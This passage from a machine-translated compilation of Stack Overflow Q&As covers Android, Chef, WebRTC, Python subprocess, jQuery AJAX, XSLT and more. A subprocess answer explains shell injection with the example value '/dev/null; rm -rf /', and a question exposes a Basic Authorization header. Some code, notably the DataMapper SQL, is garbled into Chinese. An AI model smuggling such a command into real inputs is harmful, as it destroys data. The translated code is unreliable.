<HorizontalScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/hsv"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >
    <LinearLayout
        android:id="@+id/mygallery"
        android:layout_width="wrap_content"
        android:layout_height="match_parent"
        android:orientation="horizontal" >
    </LinearLayout>

</HorizontalScrollView> 
```

在 LinearLayout 中，我通过以下方式加载图像：

```
myGallery = (LinearLayout) findViewById(R.id.mygallery);
for (int i = 1; i <= 5; i++) {
    ImageView iv = new ImageView(getApplicationContext());
    iv.setLayoutParams(new LayoutParams(screenWidth,LayoutParams.WRAP_CONTENT));
    iv.setImageBitmap(decodeSampledBitmapFromResource(getResources(),getResources().getIdentifier("pic0" + i, "drawable",getPackageName()), screenWidth, screenHeight));
    myGallery.addView(iv); 
```

当用户滚动图像时，我需要锁定居中的图像（如`Gallery`）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T10:41:51.837

You should use `smoothScrollTo(x,y)` so it will appear that the image is locked at the correct position. X and Y should be calculated manually.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-06-27T06:41:44.413

这是我的解决方案： 1.create custom view

```
public class CenteringHorizontalScrollView extends HorizontalScrollView implements View.OnTouchListener {

private static final int SWIPE_PAGE_ON_FACTOR = 5;
View targetLeft, targetRight;
CircleImageView leftImage, rightImage;
private Context mContext;
private int mActiveItem;
private float mPrevScrollX;

private int mItemWidth = 250;// or whatever your item width is.
private int centreItemWidth = 350;
private final int LEFT = 1;
private final int RIGHT = 2;
private final int NA = 0;
private final int emptyView = 2;
private static String TAG = CenteringHorizontalScrollView.class.getSimpleName();

public CenteringHorizontalScrollView(Context context, AttributeSet attrs) {
    super(context, attrs);
    mContext = context;
    setOnTouchListener(this);

}

@Override
public boolean onTouch(View v, MotionEvent event) {
    int x = (int) event.getRawX();

    boolean handled = false;
    switch (event.getAction()) {
        case MotionEvent.ACTION_DOWN:
            mPrevScrollX = x;
            break;
        case MotionEvent.ACTION_MOVE:

            break;
        case MotionEvent.ACTION_UP:
            int minFactor = mItemWidth / SWIPE_PAGE_ON_FACTOR;

            if ((mPrevScrollX - (float) x) > minFactor) {
                if (mActiveItem < getMaxItemCount() - 1 - emptyView) {
                    setCurrentItem(mActiveItem + 1);
                    CommonConstant.currentChildIdx = (mActiveItem - emptyView);
                } 
            } else if (((float) x - mPrevScrollX) > minFactor) {
                if (mActiveItem > 0 + emptyView) {
                    setCurrentItem(mActiveItem - 1);
                    CommonConstant.currentChildIdx = (mActiveItem - emptyView);
                } 
            }
            scrollToActiveItem(NA);

            handled = true;
            break;
    }

    return handled;
}

private int getMaxItemCount() {
    return ((LinearLayout) getChildAt(0)).getChildCount();
}

private LinearLayout getLinearLayout() {
    return (LinearLayout) getChildAt(0);
}

private void setCurrentItem(int cur) {
    if (cur < 0 + emptyView) {
        mActiveItem = 2;
    } else if (cur > getMaxItemCount() - 1 - emptyView) {
        mActiveItem = getMaxItemCount() - 1 - emptyView;
    } else {
        mActiveItem = cur;
    }
}

/**
 * Scrolls the list view to the currently active child.
 */
private void scrollToActiveItem(int direction) {
    int maxItemCount = getMaxItemCount();
    if (maxItemCount == 0) {
        return;
    }

    int targetItem = Math.min(maxItemCount - 1, mActiveItem);
    targetItem = Math.max(0, targetItem);

    setCurrentItem(targetItem);
    targetItem = mActiveItem;

    // Scroll so that the target child is centered
    View targetView = getLinearLayout().getChildAt(targetItem);
    LinearLayout centerLayout = (LinearLayout) targetView;
    ImageView centerImage = (ImageView) centerLayout.getChildAt(0);
    centerImage.setBackground(mContext.getResources().getDrawable(R.drawable.rectangle_background));

    //get the image to left of the centered image
    if ((targetItem - 1) >= 0) {
        targetLeft = getLinearLayout().getChildAt(targetItem - 1);
        LinearLayout ll = (LinearLayout) targetLeft;
        leftImage = (CircleImageView) ll.getChildAt(0);
        centerImage.setBackground(null);
    }
    //get the image to right of the centered image
    if ((targetItem + 1) < maxItemCount) {
        targetRight = getLinearLayout().getChildAt(targetItem + 1);
        LinearLayout ll = (LinearLayout) targetRight;
        rightImage = (CircleImageView) ll.getChildAt(0);
        centerImage.setBackground(null);
    }
    int targetLeftx = centerLayout.getLeft();
    int childWidth = centerLayout.getRight() - targetLeftx;
    int width = getWidth() - getPaddingLeft() - getPaddingRight();
    int targetScroll = targetLeftx - ((width - childWidth) / 2);

    super.smoothScrollTo(targetScroll, 0);
}

/**
 * Sets the current item and centers it.
 *
 * @param currentItem The new current item.
 */
public void setCurrentItemAndCenter(int currentItem) {
    setCurrentItem(currentItem + emptyView);
    scrollToActiveItem(NA);
}
} 
```

2.在活动/片段中

```
 private void initScrollView() {
    tools_top_scroll = (CenteringHorizontalScrollView) getActivity().findViewById(R.id.horizontalScrollView);
    rl = (LinearLayout) getActivity().findViewById(R.id.tools_top);

    addEmptyChildView();
    addEmptyChildView();
    for (int i = 0; i < 5; i++) {
        setInnerChildView(getChildren().get(i));
    }
    addEmptyChildView();
    addEmptyChildView();
    tools_top_scroll.post(new Runnable()
    {
        @Override
        public void run()
        {
            tools_top_scroll.setCurrentItemAndCenter(CommonConstant.currentChildIdx);
        }
    });
}

private void setInnerChildView(ChildR childR) {
    View view = LayoutInflater.from(getActivity()).inflate(R.layout.item_head_name, null);
    ImageView child_img = (ImageView) view.findViewById(R.id.child_img);
    TextView child_name = (TextView) view.findViewById(R.id.child_name);
    Log.i(TAG, "child name:" + childR.getChild().getC_name());
    child_name.setText(childR.getChild().getC_name());
    rl.addView(view);

}

private void addEmptyChildView() {
    View view = LayoutInflater.from(getActivity()).inflate(R.layout.item_head_name, null);
    view.setVisibility(View.INVISIBLE);
    rl.addView(view);

} 
```

3.在xml中

```
 <com.shouhu.angel.view.CenteringHorizontalScrollView

    android:id="@+id/horizontalScrollView"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:background="@mipmap/tool_f_top_bg"
    android:scrollbars="none">

    <LinearLayout
        android:id="@+id/tools_top"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_gravity="center_vertical"
        android:gravity="center"
        android:orientation="horizontal">

    </LinearLayout>
</com.shouhu.angel.view.CenteringHorizontalScrollView> 
```

# ruby - 如何以幂等方式使用 Chef 添加 NFS 共享？

> ID：13491373
> 
> 赞同：3
> 
> 时间：2012-11-21T10:36:30.873
> 
> 标签：ruby, linux, chef-infra, nfs

我想使用 Chef 在 Linux 中使用 NFS 共享文件夹。到目前为止，我有这个：

```
#share the path using NFS
File.open("/etc/exports", 'a') do |file|
    file.puts FS_BASE_PATH+" *(rw)"
  end 
```

哪个有效，一次。随后的配置复制了这一行。

我是否继续沿此路径检查文件内容以查看它是否已包含 Ruby 中的行？或者，是否有一个命令可以配置 NFS 共享而无需直接编辑导出文件，它代表我解决了这个问题？在 Windows 中，我会使用 NET SHARE。

Linux 和 NFS 的风格是：Ubuntu 12.04，nfs-kernel-server

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-22T08:12:01.903

一般建议由 Chef 管理整个文件。在这种情况下，我将使用“nfs”说明书（或任何您命名的）中导出共享的属性，然后使用“模板”资源来管理文件的内容。食谱的属性文件中的类似内容，或通过角色应用：

```
default['nfs']['exports'] = ["/srv/export 10.0.0.0/8(ro,sync,no_root_squash)"] 
```

配方中的模板：

```
template "/etc/exports" do
  source "exports.erb"
  mode 00644
end 
```

然后是模板本身：

```
<%- node['nfs']['exports'].each do |line| %>
<%= line %>
<%- end %> 
```

当然，已经有一本非常不错的 NFS 食谱，由一位优秀的食谱作者在[Chef 社区网站 (nfs cookbook)](http://community.opscode.com/cookbooks/nfs)上发表。它非常完整，包括测试。

# websocket - 通过 Websocket 发送 WebRTC MediaStream（RTP over HTTP/Websocket）

> ID：13491377
> 
> 赞同：9
> 
> 时间：2012-11-21T10:36:41.147
> 
> 标签：websocket, rtp, webrtc

WebRTC 主要用于浏览器到浏览器的实时媒体通信，但在我的情况下，它将用于浏览器到服务器的音频通信。

根据我收集的信息，MediaStream 是使用 RTP over UDP 传输的。

除了用于信令的协议之外，这将需要至少两个额外的端口，这是我想避免的。

在 WebRTC 中，是否有可能使用 RTP over Websocket 而不是 RTP over UDP，这样我只需要使用端口 80 或 443？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-27T10:18:04.973

不，使用 WebRTC 是不可能的。

WebRTC 旨在为浏览器提供三个主要功能：

1.  能够访问设备的摄像头和麦克风；
2.  能够建立 SRTP 会话以发送/接收音频和视频；
3.  在浏览器之间建立点对点数据通道的能力；

Web 应用程序可以通过[此处](http://dev.w3.org/2011/webrtc/editor/webrtc.html)定义的 Javascript API 访问这些功能。要访问媒体设备，您可以使用[getUserMedia()](http://dev.w3.org/2011/webrtc/editor/getusermedia.html)并且您将获得一个 MediaStream 以附加到 HTML5 音频和视频标签。要创建 SRTP 会话，您需要[创建对等连接](http://www.w3.org/TR/2011/WD-webrtc-20111027/#peer-to-peer-connections)并管理要使用的流。

您必须向浏览器请求媒体 SDP 提供并使用任何协议（例如 websockets）将其发送给另一方。当对方收到您的 SDP 报价时，它可以将其注入浏览器，请求 SDP 答复，然后将其发回。一旦两个浏览器都有报价，它们就会使用 ICE 开始 SRTP 协商。

因此，您将无法访问 RTP 数据包以通过 websocket 发送它们。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-30T18:50:24.980

实际上，计划是支持 RTCP-mux [RFC 5761](https://www.rfc-editor.org/rfc/rfc5761)和某种形式的 BUNDLE（仍在辩论中）将**所有**流合并到一个端口上。但是，端口将由 ICE/STUN 选择。需要时，它还会使用 TURN，并最终支持 TURN-TCP，我相信它可以在端口 80 上运行。然而，质量会受到影响。

# python - 我可以在 Python 2.7 中从基于 raw_input 的模块导入吗？

> ID：13491384
> 
> 赞同：2
> 
> 时间：2012-11-21T10:37:05.577
> 
> 标签：python, python-2.7

在 Python 2.7 中是否可以获取用户输入并使用它来确定加载哪个模块？

我试过类似的东西：

```
userModule = raw_input("Which module to import? ")
from userModule import * 
```

没有名为 userModule 的预先存在的模块...

当前返回：**ImportError: No module named userModule**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-21T10:39:52.720

使用`importlib`模块，还有一点小`globals()`技巧：

```
import importlib

userModule = raw_input("Which module to import? ")

mod = importlib.import_module('signal')
names = mod.__all__ if hasattr(mod, '__all__') else dir(mod)
g = globals()
for name in names:
    g[name] = getattr(mod, name)
del g, name, names, mod, importlib 
```

请注意，这不是最简单和最直接的任务，您可能需要重新考虑这样做的智慧。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-21T10:40:58.440

一种解决方案是使用以下`__import__`功能：

```
userModuleName = raw_input("Which module to import? ")
try:
    userModule = __import__(userModuleName)
except ImportError:
    print "could not import", userModuleName 
```

# ruby - 从关联表中查询属性，使用 DataMapper 计算值

> ID：13491387
> 
> 赞同：0
> 
> 时间：2012-11-21T10:37:21.870
> 
> 标签：ruby, datamapper, ruby-datamapper

人员表

```
-------------------------------------------------- ----------
编号 | 姓名 | 成本价格 | 出售价格 | 产品编号 |
-------------------------------------------------- ----------
 1人1 10000 20000 1
 2人2 20000 30000 2
 3人3 30000 40000 3

```

产品表

```
--------------
编号 | 姓名 |
--------------
 1 个产品1
 2 产品2
 3 产品3

```

**我的 SQL 查询**

```
选择名称，（成本价格 - 销售价格）作为利润，产品名称
从人
person.product_id = products.id 上的内部连接产品
其中product.id = 1
按 product.name asc 排序

```

我无法在 Data Mapper 中复制它，这是我尝试过的（我已经正确定义了模型及其关联）

```
人.所有（

# SQL 连接等价
  Person.product.id => 1,  

#products.name 怎么定义呢？
# 也可以直接取cost_price-selling_price作为利润还是
# 我们需要对结果集进行建模吗？
  :fields => ['id', 'name', 'cost_price', 'sales_price']

# 如何按 product.name 订购？
  :order => []
)

```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T11:00:30.970

获取人：

```
person = Person.first id: 1
# or
person = Person[1] 
```

`person`现在包含所有相关产品（DataMapper 为您完成所有连接工作），
您只需要获取/列出它们：

```
products = person.products order: :name.asc 
```

关于`(cost_price - selling_price) as profit`
您可以在`Person`模型中添加一个方法，如下所示：

```
class Person
  # ...

  def profit
    cost_price - selling_price
  end
end 
```

迭代人员/产品：

```
Person.each do |person|
  puts person.name
  puts " Profit: #{person.profit}"
  puts " Products:"
  person.products.all(order: :name).each do |product|
    puts "  #{product.name}"
  end
end 
```

# python - 为什么不在 Python 中的 subprocess.Popen 中使用 `shell=True`？

> ID：13491392
> 
> 赞同：3
> 
> 时间：2012-11-21T10:37:31.487
> 
> 标签：python, linux, shell, process, subprocess

我有一个很长的单行 shell 命令要由 Python 调用。代码是这样的：

```
# "first way"
def run_cmd ( command ):
    print "Run: %s" % command
    subprocess.call (command, shell=True)
run_cmd('''sort -n -r -k5 {3} |head -n 500|awk 'OFS="\t"{{if($2-{1}>0){{print $1,$2-{1},$3+{1},$4,$5}}}}' > {2}'''.format(top_count,extend/2,mid,summit)) 
```

这些代码有效，但它总是这样抱怨：

```
sort: write failed: standard output: Broken pipe
sort: write error
awk: (FILENAME=- FNR=132) fatal: print to "standard output" failed (Broken pipe) 
```

根据[先前的答案](https://stackoverflow.com/questions/4106565/newbie-python-subprocess-problem-write-error-broken-pipe)，我需要使用更长的脚本来完成此操作，例如：

```
# "second way"
p1 = Popen("sort -n -r -k5 %s"%summit, stdout=PIPE)
p2 = Popen("head -n 500", stdin=p1.stdout, stdout=PIPE)
# and so on .......... 
```

我的问题是：

（1）“第二种方式”是否会比“第一种方式”慢

（2）如果我必须以“第一种方式”写（因为写起来更快），我怎样才能避免像这样的抱怨`broken pipe`

(3) 我不应该以“第一方式”写作的最令人信服的理由是什么

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-21T11:06:26.297

`shell = True`如果您的输入数据来自不受信任的来源，则使用可能会带来安全风险。例如，如果您的`mid`变量的内容是`"/dev/null; rm -rf /"`. 在您的情况下似乎并非如此，所以我不会太担心。

在您的代码中，您将结果`awk`直接写入`mid`. 要调试问题，您可能需要在 python 程序中使用`subprocess.check_output`并读取调用的结果。`awk`

```
cmd = """sort -n -r -k5 %s |
      head -n 500|
      awk 'OFS="\t"{{if($2-{1}>0){{print $1,$2-{1},$3+{1},$4,$5}}}}'""".format(summit, top_count)

subprocess.check_call(cmd, shell=True, stdout=file) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-10T04:59:50.320

> （1）“第二种方式”是否会比“第一种方式”慢

启动一个新进程是一项昂贵的操作，因此在允许 shell 解析命令行并启动子进程与在 Python 中自己执行之间应该没有太大区别。唯一重要的基准是硬件上的代码。测量它。

> （2）如果我必须以“第一种方式”写（因为写起来更快），我怎样才能避免像破管子一样的抱怨

第一个“损坏的管道”可能类似于：[“是”报告错误与子进程通信（）](https://stackoverflow.com/q/22077881/4279)。尝试[我在那里提供的解决方法](https://stackoverflow.com/a/22083141/4279)。

您可以通过将管道标准输出重定向到`mid`文件来修复第二个损坏的管道：

```
with open(mid, 'wb') as file:
    check_call(pipeline, shell=True, stdout=file) 
```

它`> {2}`在没有外壳的情况下在您的命令中实现。

> (3) 我不应该以“第一方式”写作的最令人信服的理由是什么

如果任何`top_count`, `extend`, `mid`,`summit`来自不完全由您控制的来源，那么您就有可能在您的用户下运行任意命令。

* * *

`plumbum`模块提供安全性和可读性（如果在这种情况下对您很重要，请测量时间性能）：

```
from plumbum.cmd import awk, head, sort

awk_cmd = 'OFS="\t"{if($2-%s>0){print $1,$2-%s,$3+%s,$4,$5}}' % (extend/2,)*3
(sort["-n", "-r", "-k5", summit] | head["-n", "500"] | awk[awk_cmd] > mid)() 
```

请参阅，[如何使用 subprocess.Popen 通过管道连接多个进程？](https://stackoverflow.com/q/295459/4279)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-21T11:11:19.230

它不太可能变慢，但您始终可以使用[timeit](http://docs.python.org/2.7/library/timeit.html)对其进行测试以确保它。不采用第一种方式有两个很好的理由。第一个是虽然第一次打字可能会稍微快一点，但可读性大大降低，[可读性](http://www.python.org/dev/peps/pep-0020/)很重要。二是使用`shell=True`存在[巨大的安全隐患](http://docs.python.org/2/library/subprocess.html#using-the-subprocess-module)，原则上应避免使用。

# javascript - 我似乎无法让我的 $.ajax 调用正常工作

> ID：13491394
> 
> 赞同：4
> 
> 时间：2012-11-21T10:37:33.377
> 
> 标签：javascript, jquery, ajax, json

> **可能重复：**
> [带有 jquery.ajax() 的跨域“授权”标头](https://stackoverflow.com/questions/9559947/cross-origin-authorization-header-with-jquery-ajax)

**jQuery**

我正在使用 [http://code.jquery.com/jquery-1.7.2.min.js](http://code.jquery.com/jquery-1.7.2.min.js)

如果我在浏览器中输入 -> [http://pol638_047fe0/JSON.HTML?FN=GetPages&PIN=7659](http://pol638_047fe0/JSON.HTML?FN=GetPages&PIN=7659)我会收到一个包含我的 json 内容的文件

**Javascript**

```
var url = 'http://pol638_047fe0/JSON.HTML';

$.ajax({
url:      url,
type:     'GET',
dataType: 'json',
username: 'ADMIN',
password: '1234',
data: {
    'FN':  'GetPages',
    'PIN': '7659' 
},
xhrFields: {
    withCredentials: true
},
sucess: function(data) {
    alert('done');
    console.log('data', data);
}
}); 
```

**Chrome 开发者工具**

控制台输出：Origin null 错误

```
XMLHttpRequest cannot load http://pol638_047fe0/JSON.HTML?FN=GetPages&PIN=7659\. Origin null is not allowed by Access-Control-Allow-Origin. 
```

这并没有真正困扰我，因为服务器不应该关心谁使用正确的用户名和密码访问数据。

网络标题：

```
Request URL:http://pol638_047fe0/JSON.HTML?FN=GetPages&PIN=7659
Request Headersview source
Accept: '*/*'
Cache-Control: max-age=0
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko)       Chrome/23.0.1271.64 Safari/537.11
Query String Parametersview URL encoded
FN: GetPages
PIN: 7659 
```

好的。这里肯定出了问题..

现在奇怪的是，如果我将此 ajax 调用**添加**到代码中：

```
...
$.ajax({
url : url,
data: {
    'FN'    : 'GetPages',
    'PIN'   : '7659' 
}
}); 
```

我在 Network 下收到另一个 JSON.HTML 文件，响应正确：

```
Request URL: http://pol638_047fe0/JSON.HTML?FN=GetPages&PIN=7659
Request Method: GET
Status Code: 200 OK
Request Headersview source
Accept: application/json, text/javascript, '*/*'; q=0.01
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
Accept-Encoding: gzip,deflate,sdch
Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4
Authorization: Basic QURNSU46U0JUQWRtaW4h
Cache-Control: max-age=0
Connection: keep-alive
Host: pol638_047fe0
Origin: null
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko)     Chrome/23.0.1271.64 Safari/537.11
Query String Parametersview URL encoded
FN: GetPages
PIN: 7659
Response Headersview source
Connection: close
Content-Type: application/octet-stream
Server: Keil-EWEB/2.1 
```

回复：

```
[{"pg":0,"descr":"PC1"},{"pg":1,"descr":"PC2"},{"pg":2,"descr":"PC3"},{"pg":3,"descr":"HG1"},{"pg":4,"descr":"HG2"},{"pg":5,"descr":"HG3"},{"pg":6,"descr":"HG4"},{"pg":7,"descr":"DW1"},{"pg":8,"descr":"DW2"},{"pg":9,"descr":"CMN"}] 
```

## 我的想法已经用完了，我很感谢任何帮助或建议！

**选拔赛**

将类型更改为 jsonp 可以帮助我收到响应，但没有太大帮助，因为我收到了 Uncaught SyntaxError: Unexpected token ILLEGAL Error。我认为这是因为响应不是 jsonp 格式的。有什么办法可以得到json响应吗？

更改服务器上的访问标头。我没有权利这样做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-21T17:49:20.323

我建议您阅读这篇文章： http: [//www.codeproject.com/Articles/42641/JSON-to-JSONP-Bypass-Same-Origin-Policy](http://www.codeproject.com/Articles/42641/JSON-to-JSONP-Bypass-Same-Origin-Policy)

XMLHttpRequest（ajax 请求）不允许您进行跨域调用。这是浏览器本身设置的限制。但是，如果您的 Web 服务（或 Web API）在同一个域（与您的网站相同）上运行，它会非常有效。查找[Same_origin_policy](http://en.wikipedia.org/wiki/Same_origin_policy)

# iphone - ASIHTTPRequest 在 3G 上很奇怪

> ID：13491399
> 
> 赞同：0
> 
> 时间：2012-11-21T10:37:47.563
> 
> 标签：iphone, objective-c, asihttprequest

我想使用 ASIHTTPRequest 下载文件，方法如下：

```
ASIHTTPRequest *request;
request = [ASIHTTPRequest requestWithURL:[NSURL URLWithString:downloadServer]];
[request setUserInfo:[NSDictionary dictionaryWithObject:@"download" forKey:@"download"]];
[request setDidFinishSelector:@selector(downloadIsFinished:)];
[request setDidFailSelector:@selector(downloadIsFailed:)];
[request setDelegate:self];
[request setTimeOutSeconds:40];
[request setDownloadProgressDelegate:self];
[request setShowAccurateProgress:YES];
[request startAsynchronous]; 
```

如果我在 Wifi 上一切都很好，但如果我在 3G 上，那么我的方法会尝试下载文件，但 10 秒后 downloadIsFinish 委托会触发，但我的文件实际上并没有被下载......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T13:12:58.980

这种事情通常是由于没有`NSURLConnectionDelegate`正确实现方法而导致的错误。一种可见的副作用可能是出现在您的 UI 中的半下载图像。

例如，如果服务器在您收到整个响应之前断开连接，则不会引发错误`NSURLConnection`。`connectionDidFinishLoading:`像往常一样被调用。您必须明确检查您收到的字节数是否等于`Content-Length`标头中指定的数字（如果存在）。如果您尚未收到所有数据，则需要自己引发错误。

请注意，开发`ASIHTTPRequest`已停止。请参阅[其创建者的这篇博文](http://allseeing-i.com/%5Brequest_release%5D;)。

现在大多数人似乎都在推荐[`AFNetworking`](https://github.com/AFNetworking/AFNetworking)，尽管上次我检查他们也没有处理这种早期断开连接的情况。

# javascript - 为什么 .js 文件和 css 文件在视图文件夹中没有在 asp.net MVC4 中提供服务

> ID：13491400
> 
> 赞同：-1
> 
> 时间：2012-11-21T10:37:52.080
> 
> 标签：javascript, asp.net-mvc, asp.net-mvc-4, publish

如果 .js 文件和 css 文件在视图文件夹中，则它们不会被提供。如果驻留在同一个文件夹中，任何想法需要什么修复才能使它们都工作。

```
Path : Views\Shared\Javascripts
       Views\Shared\abc.cshtml 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-21T10:46:16.490

如果您查看`~/Views`（或`~/Areas/<area name>/Views`，如果您正在使用区域）文件夹，您会注意到一个 web.config 阻止从该位置提供任何资源。虽然您可以编辑该 web.config 以允许提供静态资产，但我强烈警告您不要这样做。

相反，将资产放在另一个文件夹中。默认情况下，MVC 项目有一个`~/Content`和`~/Scripts`文件夹（分别为 CSS/images 和 JS）。我鼓励你坚持使用这些文件夹。

*编辑以反映最近的编辑*

说你有`abc.js`。将其移至`~/Scripts/abc.js`. 您可以像这样包含该脚本`abc.cshtml`：

```
 <script type="text/javascript" src="@Url.Content("~/Scripts/abc.js")"></script> 
```

# python - 如何在 Mac OS X 10.7 上的 virtualenv 中安装 PyAudio

> ID：13491401
> 
> 赞同：10
> 
> 时间：2012-11-21T10:37:54.843
> 
> 标签：python, macos, virtualenv, pyaudio

我试过了

```
easy_install pyaudio 
```

它不起作用。我得到以下信息：

```
Searching for pyaudio
Reading http://pypi.python.org/simple/pyaudio/
Reading http://people.csail.mit.edu/hubert/pyaudio/
Best match: pyaudio 0.2.7
Downloading http://people.csail.mit.edu/hubert/pyaudio/packages/pyaudio-0.2.7.tar.gz
Processing pyaudio-0.2.7.tar.gz
Writing /var/folders/vg/98k5hfl52m16wm45ckdx1_5c0000gp/T/easy_install-s1wLkT/PyAudio-0.2.7/setup.cfg
Running PyAudio-0.2.7/setup.py -q bdist_egg --dist-dir /var/folders/vg/98k5hfl52m16wm45ckdx1_5c0000gp/T/easy_install-s1wLkT/PyAudio-0.2.7/egg-dist-tmp-pFDrFR
warning: no files found matching '*.c' under directory 'test'
clang: warning: argument unused during compilation: '-mno-fused-madd'
src/_portaudiomodule.c:29:10: fatal error: 'portaudio.h' file not found
#include "portaudio.h"
         ^
1 error generated.
error: Setup script exited with error: command 'clang' failed with exit status 1 
```

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-11-21T13:07:56.390

看来您还没有安装 Portaudio。
您可以从 Macports 或 Homebrew 获得它。

*   `sudo port install portaudio`
*   `sudo brew install portaudio`

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-10-13T13:34:47.373

或者用 brew

```
brew install portaudio 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-21T12:39:28.520

它可能依赖于一些需要单独编译和安装的 C 库。就像任何提供“portaudio.h”的东西一样。大多数这些东西都经过测试，`linux`其中包管理器可以自动处理这类事情，而 OS X 是非免费的，必须绕过许可雷区。

# jqgrid - jqgrid edittype为文件自定义

> ID：13491402
> 
> 赞同：1
> 
> 时间：2012-11-21T10:37:58.130
> 
> 标签：jqgrid

在编辑/添加表单 jqGrid 中，一个字段必须上传文件。第一次我使用edittype=file。但是我需要改变这个元素的视图，这就是为什么我通过这个函数使用 edittype=custom

```
function myelem (value, options) {
                                      var el=$("<div class='type_file'>"+
                                        "<input type='file' class='inputFile' id='"+options.name+"' name='"+options.name+"'/>" +
                                        "<div class='fonTypeFile'><input type='text' class='inputFileVal' readonly='readonly' id='fileName'"+
                                        " /></div>"+
                                        "</div>");
                                        var g='',val_file;
                                       $('.inputFile').change(function () { 
                                            g=$('.inputFile').val();        alert(g);                                   
                                            $('.inputFileVal').val(g);                                              
                                        }); 

                                    return el;
                                    }
                                    function myvalue(elem, operation, value) {
                                         $('input',elem).val('');
                                    } 
```

用户选择的文件必须显示在文本字段中。但这是行不通的。这个怎么改？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T06:51:15.630

我在表单中添加元素，然后使用自定义元素的偏移量为图像创建偏移量（上传）。

CSS：

```
.customelement { 
position: absolute; 
top: 0;
left: 0;
z-index: 2;
filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0); 
-moz-opacity: 0;
-khtml-opacity: 0;
opacity: 0;
width: 237px; }
.fonTypeFile { 
width: 237px; 
height: 23px;
background: url(images/inputFile.png); 
position: relative;
top: 0;
left: 22;
z-index: 1;}       

 .inputFileVal { 
position: relative;
top: 3px;
left: 5px;
z-index: 2;
width: 150px;
background: none;
border: none;} 
```

脚本：

```
function myelem (value, options) {
                                        var st="<input type='file'/><div class='fonTypeFile'><input type='text' class='inputFileVal' readonly='readonly' id='fileName'/></div>";                                            
                                        var el=$(st);
                                            $(el).change(function () {                                                      
                                                    var val_f=$(el).val();
                                                    $('.inputFileVal').val(val_f);
                                            });
                                        return el;
                                }
                                    function myvalue(elem, operation, value) {
                                        return $(elem).find("input").val();
                                    }
function  for_file(){
                                        $(".fonTypeFile").removeClass("customelement");
                                        var form_offset=$('.FormGrid').offset();
                                        var offset=$('.fonTypeFile').offset();
                                        var left=offset.left-form_offset.left;
                                        var top=offset.top-form_offset.top;
                                        $('.customelement').css({'left':left, 'top':top});
                                    }
$('#words').jqGrid({...}).navGrid('#wordsPager',... {...afterShowForm: function (formid) for_file();    }...}); 
```

# xpath - XSLT 使用 XSLT 数组过滤结果

> ID：13491404
> 
> 赞同：4
> 
> 时间：2012-11-21T10:38:14.623
> 
> 标签：xpath, xslt-1.0, transformation, xslt

我是 XSLT 的初学者。

下面是我收到的源 XML。`Request`tag 包含`FlightId`用于过滤`Result`标记的哪个。

**源 XML：**

```
<Response>
    <Request>
        <RequestedFlights>
            <FlightId>2121</FlightId>
            <FlightId>2584</FlightId>
        </RequestedFlights>
    </Request>
    <Result>
        <Flights>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>1</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>2</Id>
                        <FlightNumber>1121</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>3</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>4</Id>
                        <FlightNumber>2584</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
            <Flight>
                <Segments>
                    <Segment>
                        <Id>5</Id>
                        <FlightNumber>2121</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>6</Id>
                        <FlightNumber>2584</FlightNumber>
                    </Segment>
                    <Segment>
                        <Id>7</Id>
                        <FlightNumber>2023</FlightNumber>
                    </Segment>
                </Segments>
            </Flight>
        </Flights>
    </Result>
</Response> 
```

**XSLT：**

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
version="1.0">

    <xsl:output method="xml" indent="yes" />
    <xsl:variable name="ReqFlights" select="//Request/RequestedFlights/FlightId" />
    <xsl:variable name="FilterFlights" select="//Result/Flights/Flight[Segments/Segment/FlightNumber=$ReqFlights]"/>

    <xsl:template match="Response">
        <FilterResult>
            <ResultCount>
                <xsl:value-of select="count($FilterFlights)"/>
            </ResultCount>
            <xsl:copy>
                <xsl:copy-of select="$FilterFlights"/>
            </xsl:copy>
        </FilterResult>
    </xsl:template>
</xsl:stylesheet> 
```

我使用上面的 XSLT 收到了以下输出。

**输出：**

```
<FilterResult>
    <ResultCount>3</ResultCount>
    <Response>
        <Flight>
            <Segments>
                <Segment>
                    <Id>1</Id>
                    <FlightNumber>2121</FlightNumber>
                </Segment>
                <Segment>
                    <Id>2</Id>
                    <FlightNumber>1121</FlightNumber>
                </Segment>
            </Segments>
        </Flight>
            <Flight>
            <Segments>
                <Segment>
                    <Id>3</Id>
                    <FlightNumber>2121</FlightNumber>
                </Segment>
                <Segment>
                    <Id>4</Id>
                    <FlightNumber>2584</FlightNumber>
                </Segment>
